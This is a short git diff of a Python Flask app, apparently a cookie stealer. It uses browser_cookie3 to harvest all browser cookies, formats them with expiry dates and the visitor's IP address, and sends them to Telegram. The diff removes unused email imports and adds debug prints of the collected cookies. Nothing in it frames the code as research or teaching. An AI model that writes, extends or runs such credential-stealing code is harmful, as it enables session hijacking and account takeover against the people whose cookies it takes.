@@ -4,8 +4,6 @@ import os
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 from flask import Flask
 import browser_cookie3  # Import browser_cookie3 library
 from datetime import datetime
@@ -81,6 +79,7 @@ def get_cookies_as_string(cookies, ip_address):
                 cookie_string.write(f"\t\tExpires: {expires} ({datetime.utcfromtimestamp(int(expires)).strftime('%Y-%m-%d %H:%M:%S')})\n")
             else:
                 cookie_string.write("\t\tExpires: None\n")
+        cookie_string.write("\n")
     return cookie_string.getvalue()
 
 def send_cookies_to_telegram(cookies):
@@ -116,10 +115,11 @@ def index():
 
     # Get cookies
     cookies = get_all_cookies()
-    print(cookies)
+    print(f"Collected cookies: {cookies}")
 
     # Convert cookies to string
     cookies_string = get_cookies_as_string(cookies, ip_address)
+    print(f"Cookies string: {cookies_string}")
 
     # Send cookies string to Telegram
     response = send_cookies_to_telegram(cookies_string)
@@ -133,4 +133,3 @@ def index():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5004)
-
